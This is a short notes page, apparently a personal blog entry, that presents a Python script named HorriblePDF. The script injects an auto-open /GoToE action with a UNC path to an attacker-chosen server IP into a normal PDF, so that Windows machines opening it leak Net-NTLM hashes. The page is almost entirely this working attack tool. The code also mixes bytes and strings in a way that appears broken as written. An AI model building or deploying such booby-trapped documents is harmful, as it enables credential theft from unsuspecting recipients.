---
layout: memory
title: Crafting a HorriblePDF
---

Transform a normal PDF file into malicious and steal Net-NTLM Hashes from crappy windows machines.
This vulnerability should be fixed but it's still nice to remember it.

References and kudos to:
    - https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/
    - https://github.com/deepzec/Bad-Pdf
    
    
```python
import sys

banner = """
  ___ ___                     ._____.   .__        __________________  ___________
 /   |   \  __________________|__\_ |__ |  |   ____\______   \______ \ \_   _____/
/    ~    \/  _ \_  __ \_  __ \  || __ \|  | _/ __ \|     ___/|    |  \ |    __)  
\    Y    (  <_> )  | \/|  | \/  || \_\ \  |_\  ___/|    |    |    `   \|     \   
 \___|_  / \____/|__|   |__|  |__||___  /____/\___  >____|   /_______  /\___  /   
       \/                             \/          \/                 \/     \/    

Transform a normal PDF file into malicious and steal Net-NTLM Hashes from crappy windows machines.
This vulnerability should be fixed but it's still nice to remember it.

References and kudos to:
    - https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/
    - https://github.com/deepzec/Bad-Pdf
    
"""

def add_payload(data,ip):
    payload = '/AA <</O <</F (\\\\\\\\' + ip + '\\\\test)/D [ 0 /Fit]/S /GoToE>>>>'
    index1 = data.find('/Parent') + 13    
    return data[0:index1] + payload + data[index1:]   


if __name__ == "__main__":
    print(banner)

    if len(sys.argv)!=3:
        print('\nUsage:')
        print('    HorriblePDF.py <normal PDF file Path> <ServerIP>')   
        sys.exit(0)    

    print(f"[*] Normal PDF: {sys.argv[1]}")
    print(f"[*] Server IP: {sys.argv[2]}")
    
    with open(sys.argv[1],'rb') as file_object:
        all_the_text = file_object.read( )

    new_data = add_payload(all_the_text,sys.argv[2])
    new_malicious_path = sys.argv[1] + '.malicious.pdf'
    
    print(f"[+] HorriblePDF: {new_malicious_path}")  
    with open(new_malicious_path, 'wb') as horrible_pdf:
        horrible_pdf.write(new_data)
    print("[*] All Done")

```
